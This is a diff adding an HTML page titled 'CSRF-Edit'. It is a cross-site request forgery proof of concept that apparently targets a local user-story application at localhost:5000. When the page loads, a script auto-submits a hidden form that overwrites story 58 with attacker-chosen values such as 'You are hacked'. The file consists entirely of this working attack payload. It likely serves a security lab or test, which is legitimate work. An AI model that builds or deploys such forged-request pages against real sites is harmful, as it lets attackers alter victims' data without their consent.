@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF-Edit</title>
+</head>
+<body>
+    <form action="http://localhost:5000/user_story_edit/58" method="POST">
+        <input type="hidden" name="title" value="You are hacked">
+        <input type="hidden" name="story_points" value="5">
+        <input type="hidden" name="status" value="Worse">
+        <input type="hidden" name="created_by" value="Made by me">
+    </form>
+
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
